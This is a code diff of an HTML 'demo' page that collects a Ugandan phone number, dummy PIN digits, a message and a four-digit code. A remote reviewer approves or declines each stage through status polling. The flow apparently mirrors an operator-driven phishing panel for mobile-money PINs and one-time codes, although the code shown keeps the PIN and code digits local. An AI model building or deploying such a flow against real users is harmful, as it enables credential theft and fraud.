@@ -3,13 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-
   <title>Independent Demo</title>
 
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
@@ -37,10 +34,7 @@
       box-shadow: 0 3px 14px #00000012;
     }
 
-    h2 {
-      margin-top: 0;
-      text-align: center;
-    }
+    h2 { margin-top: 0; text-align: center; }
 
     .notice {
       padding: 10px;
@@ -48,6 +42,7 @@
       border-radius: 6px;
       font-size: 13px;
       text-align: center;
+      line-height: 1.5;
     }
 
     .field-label {
@@ -88,8 +83,7 @@
       min-width: 0;
     }
 
-    .digit:focus,
-    textarea:focus {
+    .digit:focus, textarea:focus {
       outline: 2px solid #e3bd00;
       border-color: #171717;
     }
@@ -112,9 +106,7 @@
       cursor: wait;
     }
 
-    .hidden {
-      display: none !important;
-    }
+    .hidden { display: none !important; }
 
     .hint {
       margin-top: 10px;
@@ -153,6 +145,7 @@
       margin-top: 15px;
       background: #f4f4f4;
       border-radius: 6px;
+      line-height: 1.5;
     }
 
     .error {
@@ -162,7 +155,7 @@
     }
 
     .success {
-      font-size: 20px;
+      font-size: 44px;
       text-align: center;
       padding: 20px 0;
     }
@@ -173,17 +166,9 @@
         height: 42px;
       }
 
-      .phone-row {
-        gap: 3px;
-      }
+      .phone-row, .digits { gap: 3px; }
 
-      .digits {
-        gap: 3px;
-      }
-
-      .country {
-        padding: 10px 5px;
-      }
+      .country { padding: 10px 5px; }
     }
   </style>
 </head>
@@ -193,49 +178,55 @@
 
   <main>
     <p class="notice">
-      Demonstration only. Never enter a real PIN or OTP.
+      DEMONSTRATION ONLY. Use fictional test data.
+      Never enter a real mobile-money PIN or verification code.
+      Dummy PINs and demo codes stay in this browser.
     </p>
 
+    <!-- PHONE PAGE -->
     <section id="phonePage">
-      <h2>Phone number</h2>
-      <p>Enter a demo phone number to begin.</p>
+      <h2>Demo phone number</h2>
+      <p>Enter a test number to start the demonstration.</p>
 
-      <label class="field-label">Phone number</label>
+      <label class="field-label">Test phone number</label>
 
       <div class="phone-row">
         <span class="country">🇺🇬 +256</span>
         <div class="digits" id="phoneDigits"></div>
       </div>
 
-      <p class="hint">Enter nine digits starting with 7.</p>
+      <p class="hint">Enter nine test digits starting with 7.</p>
 
       <button id="phoneButton">CONTINUE</button>
       <p id="phoneError" class="error"></p>
     </section>
 
+    <!-- DUMMY PIN PAGE -->
     <section id="pinPage" class="hidden">
       <h2>Dummy PIN demonstration</h2>
-      <p>Enter any five digits for this demo. They stay in your browser.</p>
+      <p>Enter any five dummy digits. They are not transmitted.</p>
 
       <label class="field-label">Five dummy digits</label>
       <div class="digits" id="pinDigits"></div>
 
       <div id="pinLoading" class="hidden">
         <div class="spinner"></div>
-        <p class="status">Processing demo request…</p>
+        <p class="status">Submitting demo stage…</p>
       </div>
 
-      <p id="pinStatus" class="status">Waiting for input.</p>
+      <p id="pinStatus" class="status">Waiting for demo input.</p>
+      <p id="pinError" class="error"></p>
     </section>
 
+    <!-- MESSAGE PAGE -->
     <section id="messagePage" class="hidden">
-      <h2>Dummy message</h2>
-      <p>Enter an ordinary message for the demonstration.</p>
+      <h2>Demo message</h2>
+      <p>Enter an ordinary message for this demonstration.</p>
 
       <label class="field-label" for="messageInput">Message</label>
       <textarea id="messageInput"
         maxlength="1000"
-        placeholder="Type your demo message here"></textarea>
+        placeholder="Type a non-sensitive demo message"></textarea>
 
       <button id="messageButton">SUBMIT MESSAGE</button>
 
@@ -247,55 +238,61 @@
       <p id="messageStatus" class="status"></p>
     </section>
 
+    <!-- DEMO CODE PAGE -->
     <section id="codePage" class="hidden">
       <h2>Demo code</h2>
-      <p>Enter any four dummy digits. Do not use a real verification code.</p>
+      <p>Enter any four fictional digits. Do not use a real verification code.</p>
 
-      <label class="field-label">Four demo digits</label>
+      <label class="field-label">Four dummy digits</label>
       <div class="digits" id="codeDigits"></div>
 
       <div id="codeLoading" class="hidden">
         <div class="spinner"></div>
-        <p class="status">Processing demo status…</p>
+        <p class="status">Submitting demo stage…</p>
       </div>
 
-      <p id="codeStatus" class="status">Waiting for input.</p>
+      <p id="codeStatus" class="status">Waiting for demo input.</p>
+      <p id="codeError" class="error"></p>
     </section>
 
+    <!-- WAITING PAGE -->
     <section id="waitingPage" class="hidden">
-      <h2>Awaiting demo decision</h2>
+      <h2>Demo in progress</h2>
       <div class="spinner"></div>
       <p id="waitingText" class="status">
         Waiting for the demo reviewer…
       </p>
     </section>
 
+    <!-- SUCCESS PAGE -->
     <section id="successPage" class="hidden">
       <h2>Demo complete</h2>
       <div class="success">✓</div>
-      <p class="status">
-        The demonstration was approved successfully.
-      </p>
-      <button onclick="location.reload()">START AGAIN</button>
+      <p class="status">The demonstration was approved successfully.</p>
+      <button id="restartButton">START AGAIN</button>
     </section>
 
+    <!-- DECLINED PAGE -->
     <section id="declinedPage" class="hidden">
       <h2>Demo declined</h2>
       <p class="status">
-        The request was declined. You can return to the relevant demo stage.
+        This demo stage was declined. Restart to create a fresh demo request.
       </p>
-      <button id="retryButton">RETRY</button>
+      <button id="retryButton">RESTART DEMO</button>
     </section>
 
     <p id="globalError" class="error"></p>
   </main>
 
   <script>
+    "use strict";
+
     const $ = id => document.getElementById(id);
 
     let requestId = null;
     let currentStage = "phone";
     let pollTimer = null;
+    let busy = false;
 
     function showPage(id) {
       [
@@ -311,11 +308,34 @@
       $(id).classList.remove("hidden");
     }
 
+    function stopPolling() {
+      if (pollTimer !== null) {
+        clearInterval(pollTimer);
+        pollTimer = null;
+      }
+    }
+
     function createDigitBoxes(containerId, count, callback) {
       const container = $(containerId);
       container.innerHTML = "";
 
       const inputs = [];
+      let lastValue = "";
+
+      function reset() {
+        inputs.forEach(input => input.value = "");
+        lastValue = "";
+        if (inputs[0]) inputs[0].focus();
+      }
+
+      function checkComplete() {
+        const value = inputs.map(input => input.value).join("");
+
+        if (value.length === count && value !== lastValue) {
+          lastValue = value;
+          callback(value);
+        }
+      }
 
       for (let i = 0; i < count; i++) {
         const input = document.createElement("input");
@@ -334,47 +354,38 @@
             inputs[i + 1].focus();
           }
 
-          if (inputs.every(box => box.value.length === 1)) {
-            callback(inputs.map(box => box.value).join(""));
-          }
+          checkComplete();
         });
 
         input.addEventListener("keydown", event => {
-          if (event.key === "Backspace" &&
-              !input.value && inputs[i - 1]) {
+          if (event.key === "Backspace" && !input.value && inputs[i - 1]) {
             inputs[i - 1].focus();
           }
         });
 
         input.addEventListener("paste", event => {
           event.preventDefault();
-          const text = (event.clipboardData.getData("text") || "")
-            .replace(/\D/g, "")
-            .slice(0, count);
 
-          text.split("").forEach((digit, index) => {
-            if (inputs[index]) inputs[index].value = digit;
+          const text = (
+            event.clipboardData.getData("text") || ""
+          ).replace(/\D/g, "").slice(0, count);
+
+          inputs.forEach((box, index) => {
+            box.value = text[index] || "";
           });
 
           const nextEmpty = inputs.find(box => !box.value);
+
           if (nextEmpty) nextEmpty.focus();
 
-          if (inputs.every(box => box.value.length === 1)) {
-            callback(inputs.map(box => box.value).join(""));
-          }
+          checkComplete();
         });
 
         container.appendChild(input);
         inputs.push(input);
       }
 
-      return {
-        inputs,
-        reset() {
-          inputs.forEach(input => input.value = "");
-          inputs[0].focus();
-        }
-      };
+      return { inputs, reset };
     }
 
     async function postJSON(url, data) {
@@ -384,116 +395,137 @@
         body: JSON.stringify(data)
       });
 
-      const result = await response.json();
+      let result = {};
+
+      try {
+        result = await response.json();
+      } catch (_) {
+        throw new Error("The server returned an invalid response.");
+      }
 
       if (!response.ok) {
-        throw new Error(result.error || "Request failed.");
+        throw new Error(result.error || "The request failed.");
       }
 
       return result;
     }
 
-    function startStatusPolling() {
-      clearInterval(pollTimer);
+    async function checkStatus() {
+      if (!requestId || busy) return;
 
-      pollTimer = setInterval(async () => {
-        if (!requestId) return;
+      try {
+        const response = await fetch(
+          `/api/status/${encodeURIComponent(requestId)}`
+        );
 
-        try {
-          const response = await fetch(
-            `/api/status/${encodeURIComponent(requestId)}`
-          );
+        if (!response.ok) return;
 
-          if (!response.ok) return;
+        const result = await response.json();
 
-          const result = await response.json();
-
-          if (result.status === "approved") {
-            clearInterval(pollTimer);
-
-            if (result.stage === "message") {
-              currentStage = "message";
-              showPage("messagePage");
-              $("messageInput").focus();
-            } else if (result.stage === "demo-code") {
-              currentStage = "demo-code";
-              showPage("codePage");
-              codeBoxes.reset();
-            } else if (result.stage === "success") {
-              currentStage = "success";
-              showPage("successPage");
-            }
-          }
-
-          if (result.status === "declined") {
-            clearInterval(pollTimer);
-            showPage("declinedPage");
-          }
-        } catch (error) {
-          console.error("Status check failed:", error);
+        if (result.status === "declined") {
+          stopPolling();
+          showPage("declinedPage");
+          return;
         }
-      }, 2000);
+
+        if (result.status !== "approved") return;
+
+        if (result.stage === "message") {
+          stopPolling();
+          currentStage = "message";
+          showPage("messagePage");
+          $("messageInput").focus();
+        } else if (result.stage === "demo-code") {
+          stopPolling();
+          currentStage = "demo-code";
+          codeBoxes.reset();
+          showPage("codePage");
+        } else if (result.stage === "success") {
+          stopPolling();
+          currentStage = "success";
+          showPage("successPage");
+        }
+      } catch (error) {
+        console.error("Demo status check failed:", error);
+      }
     }
 
-    const phoneBoxes = createDigitBoxes(
-      "phoneDigits",
-      9,
-      () => {}
-    );
+    function startStatusPolling() {
+      stopPolling();
+      checkStatus();
+      pollTimer = setInterval(checkStatus, 2000);
+    }
 
-    const pinBoxes = createDigitBoxes(
-      "pinDigits",
-      5,
-      async () => {
-        $("pinLoading").classList.remove("hidden");
-        $("pinStatus").textContent = "Checking demo status…";
+    const phoneBoxes = createDigitBoxes("phoneDigits", 9, () => {});
 
-        // Dummy digits are intentionally not sent to the server.
-        try {
-          currentStage = "pin-demo";
-          $("pinLoading").classList.remove("hidden");
-          $("pinStatus").textContent =
-            "Demo input received locally. Waiting for reviewer.";
+    const pinBoxes = createDigitBoxes("pinDigits", 5, async () => {
+      if (busy || !requestId) return;
 
-          showPage("waitingPage");
-          $("waitingText").textContent =
-            "Waiting for approval of the dummy PIN demonstration.";
+      busy = true;
+      $("pinError").textContent = "";
+      $("pinLoading").classList.remove("hidden");
+      $("pinStatus").textContent = "Preparing the demo stage…";
 
-          startStatusPolling();
-        } catch (error) {
-          $("globalError").textContent = error.message;
-        }
-      }
-    );
+      try {
+        // Only the request ID is sent. Dummy PIN digits remain in the browser.
+        await postJSON("/api/pin-demo", { id: requestId });
 
-    const codeBoxes = createDigitBoxes(
-      "codeDigits",
-      4,
-      async () => {
-        $("codeLoading").classList.remove("hidden");
-
-        // The four digits are never transmitted.
+        currentStage = "pin-demo";
         showPage("waitingPage");
         $("waitingText").textContent =
-          "Waiting for approval of the demo-code stage.";
+          "Waiting for the reviewer to approve or decline this demo stage.";
 
         startStatusPolling();
+      } catch (error) {
+        $("pinError").textContent = error.message;
+        $("pinStatus").textContent = "The demo stage could not be submitted.";
+      } finally {
+        busy = false;
+        $("pinLoading").classList.add("hidden");
       }
-    );
+    });
+
+    const codeBoxes = createDigitBoxes("codeDigits", 4, async () => {
+      if (busy || !requestId) return;
+
+      busy = true;
+      $("codeError").textContent = "";
+      $("codeLoading").classList.remove("hidden");
+      $("codeStatus").textContent = "Preparing the demo-code stage…";
+
+      try {
+        // Only the request ID is sent. Dummy code digits remain in the browser.
+        await postJSON("/api/demo-code", { id: requestId });
+
+        currentStage = "code-review";
+        showPage("waitingPage");
+        $("waitingText").textContent =
+          "Waiting for the reviewer to approve or decline this demo stage.";
+
+        startStatusPolling();
+      } catch (error) {
+        $("codeError").textContent = error.message;
+        $("codeStatus").textContent = "The demo stage could not be submitted.";
+      } finally {
+        busy = false;
+        $("codeLoading").classList.add("hidden");
+      }
+    });
 
     $("phoneButton").addEventListener("click", async () => {
       $("phoneError").textContent = "";
 
-      const digits = phoneBoxes.inputs
-        .map(input => input.value)
-        .join("");
+      const digits = phoneBoxes.inputs.map(input => input.value).join("");
 
       if (!/^7\d{8}$/.test(digits)) {
         $("phoneError").textContent =
-          "Enter nine digits starting with 7.";
+          "Enter nine test digits starting with 7.";
         return;
       }
 
+      if (busy) return;
+
+      busy = true;
       $("phoneButton").disabled = true;
 
       try {
@@ -504,54 +536,67 @@
         requestId = result.id;
         currentStage = "pin-demo";
 
-        showPage("pinPage");
         pinBoxes.reset();
+        showPage("pinPage");
       } catch (error) {
         $("phoneError").textContent = error.message;
       } finally {
+        busy = false;
         $("phoneButton").disabled = false;
       }
     });
 
     $("messageButton").addEventListener("click", async () => {
+      if (busy || !requestId) return;
+
       $("messageStatus").textContent = "";
-      $("messageButton").disabled = true;
       $("messageLoading").classList.remove("hidden");
+      $("messageButton").disabled = true;
+      busy = true;
 
       try {
-        const result = await postJSON("/api/message", {
+        await postJSON("/api/message", {
           id: requestId,
           message: $("messageInput").value
         });
 
-        $("messageStatus").textContent =
-          "Message submitted. Waiting for review.";
+        currentStage = "message-review";
         showPage("waitingPage");
         $("waitingText").textContent =
-          "Waiting for the message-stage decision.";
+          "Waiting for the reviewer to approve or decline your demo message.";
 
         startStatusPolling();
       } catch (error) {
         $("messageStatus").textContent = error.message;
       } finally {
+        busy = false;
         $("messageLoading").classList.add("hidden");
         $("messageButton").disabled = false;
       }
     });
 
-    $("retryButton").addEventListener("click", () => {
-      clearInterval(pollTimer);
+    function restartDemo() {
+      stopPolling();
+      requestId = null;
+      currentStage = "phone";
+      busy = false;
 
-      if (currentStage === "message") {
-        showPage("messagePage");
-      } else if (currentStage === "demo-code") {
-        showPage("codePage");
-        codeBoxes.reset();
-      } else {
-        showPage("phonePage");
-        phoneBoxes.reset();
-      }
-    });
+      phoneBoxes.reset();
+      pinBoxes.reset();
+      codeBoxes.reset();
+
+      $("messageInput").value = "";
+      $("globalError").textContent = "";
+      $("phoneError").textContent = "";
+      $("pinError").textContent = "";
+      $("codeError").textContent = "";
+      $("messageStatus").textContent = "";
+
+      showPage("phonePage");
+    }
+
+    $("retryButton").addEventListener("click", restartDemo);
+    $("restartButton").addEventListener("click", restartDemo);
   </script>
 </body>
 </html>
